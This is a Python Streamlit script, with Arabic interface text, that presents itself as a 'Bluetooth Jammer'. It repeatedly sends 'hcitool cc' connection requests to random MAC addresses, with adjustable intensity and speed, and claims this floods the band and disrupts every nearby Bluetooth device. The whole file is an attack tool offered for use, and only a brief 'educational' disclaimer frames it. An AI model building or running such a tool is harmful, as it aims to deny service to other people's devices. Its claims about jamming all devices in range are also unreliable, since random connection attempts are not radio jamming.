#!/usr/bin/env python3
# أداة Jammer بلوتوث - تشويش مستمر بدون مسح
# يرسل إشارات تشويش فقط دون البحث عن أجهزة
# التشغيل: streamlit run bluetooth_jammer.py

import streamlit as st
import subprocess
import time
import threading
import random

# إعداد الصفحة
st.set_page_config(
    page_title="Bluetooth Jammer - منارة نونو",
    page_icon="📡",
    layout="centered"
)

st.markdown("# 📡 Bluetooth Jammer")
st.markdown("### تشويش مستمر - بدون مسح الأجهزة")
st.markdown("---")

st.warning("⚠️ هذا للاستخدام التعليمي فقط. تحقق من القوانين المحلية.")

# ============================================================
# حالة الجلسة
# ============================================================
if 'jamming' not in st.session_state:
    st.session_state.jamming = False
if 'log' not in st.session_state:
    st.session_state.log = []
if 'packets_sent' not in st.session_state:
    st.session_state.packets_sent = 0

# ============================================================
# وظائف التشويش
# ============================================================

def generate_random_mac():
    """توليد عنوان MAC عشوائي"""
    return ":".join(f"{random.randint(0, 255):02X}" for _ in range(6))

def send_jam_packet():
    """إرسال حزمة تشويش عشوائية"""
    try:
        # توليد MAC عشوائي
        fake_mac = generate_random_mac()
        
        # محاولة الاتصال بـ MAC عشوائي (إغراق)
        subprocess.run(
            ["hcitool", "cc", fake_mac],
            capture_output=True,
            timeout=0.5
        )
        return True
    except:
        return False

def continuous_jam(intensity=5, interval=0.1):
    """تشويش مستمر بدون مسح"""
    while st.session_state.jamming:
        success_count = 0
        
        # إرسال حزم تشويش بعدد حسب الشدة
        for _ in range(intensity):
            if not st.session_state.jamming:
                break
            if send_jam_packet():
                success_count += 1
                st.session_state.packets_sent += 1
            time.sleep(0.05)
        
        # تسجيل النشاط
        if success_count > 0:
            log_msg = f"📡 تم إرسال {success_count} حزمة تشويش - إجمالي: {st.session_state.packets_sent}"
            st.session_state.log.append(log_msg)
            if len(st.session_state.log) > 50:
                st.session_state.log = st.session_state.log[-50:]
        
        time.sleep(interval)

# ============================================================
# الواجهة الرئيسية
# ============================================================

st.markdown("### ⚙️ إعدادات التشويش")

col1, col2 = st.columns(2)
with col1:
    intensity = st.slider(
        "شدة التشويش:",
        min_value=1,
        max_value=20,
        value=10,
        help="عدد الحزم المرسلة في كل دورة"
    )
with col2:
    interval = st.slider(
        "السرعة (ثواني):",
        min_value=0.05,
        max_value=1.0,
        value=0.1,
        step=0.05,
        help="الوقت بين كل دورة تشويش"
    )

# ============================================================
# أزرار التحكم
# ============================================================

st.markdown("---")
col1, col2 = st.columns(2)

with col1:
    if not st.session_state.jamming:
        if st.button("🚀 بدء التشويش", use_container_width=True):
            st.session_state.jamming = True
            st.session_state.packets_sent = 0
            st.success("🔥 بدأ التشويش المستمر")
            
            # تشغيل التشويش في خيط منفصل
            thread = threading.Thread(
                target=continuous_jam,
                args=(intensity, interval),
                daemon=True
            )
            thread.start()

with col2:
    if st.session_state.jamming:
        if st.button("🛑 إيقاف التشويش", use_container_width=True):
            st.session_state.jamming = False
            st.warning("⏹️ تم إيقاف التشويش")

# ============================================================
# حالة التشويش
# ============================================================

if st.session_state.jamming:
    st.info("🔄 التشويش قيد التنفيذ...")
    st.progress(1.0, text="📡 جاري إرسال حزم التشويش")
    
    # إحصائيات حية
    col1, col2 = st.columns(2)
    with col1:
        st.metric("📦 الحزم المرسلة", st.session_state.packets_sent)
    with col2:
        st.metric("📡 الحالة", "🟢 نشط")
else:
    st.info("⏸️ التشويش متوقف")

# ============================================================
# سجل التشويش
# ============================================================

st.markdown("---")
st.markdown("### 📋 سجل التشويش")

if st.session_state.log:
    for entry in st.session_state.log[-15:]:
        st.text(entry)
else:
    st.info("لا يوجد سجل بعد")

# زر مسح السجل
if st.button("🧹 مسح السجل", use_container_width=True):
    st.session_state.log = []
    st.success("✅ تم مسح السجل")

# ============================================================
# إحصائيات
# ============================================================

st.markdown("---")
st.markdown("### 📊 إحصائيات التشويش")

col1, col2, col3 = st.columns(3)
with col1:
    st.metric("📦 إجمالي الحزم", st.session_state.packets_sent)
with col2:
    st.metric("⚡ شدة التشويش", intensity)
with col3:
    status = "🟢 نشط" if st.session_state.jamming else "🔴 متوقف"
    st.metric("📡 الحالة", status)

# ============================================================
# معلومات عن التشويش
# ============================================================

st.markdown("---")
st.markdown("### ℹ️ كيف يعمل التشويش؟")

st.markdown("""
1. **لا يبحث عن أجهزة** - يرسل إشارات عشوائية مباشرة
2. **إغراق التردد** - يرسل طلبات اتصال لعناوين MAC عشوائية
3. **تشويش شامل** - يؤثر على جميع الأجهزة في النطاق
4. **مستمر** - يعمل بشكل متواصل حتى يتم إيقافه
""")

# ============================================================
# التذييل
# ============================================================

st.markdown("---")
st.markdown("⚠️ **ملاحظات مهمة:**")
st.markdown("1. هذه الأداة ترسل إشارات تشويش مستمرة")
st.markdown("2. لا تبحث عن أجهزة، فقط ترسل حزم عشوائية")
st.markdown("3. قد تؤثر على جميع أجهزة البلوتوث القريبة")
st.markdown("4. للاستخدام التعليمي فقط")

st.markdown("made by @cheifbreef on discord :)")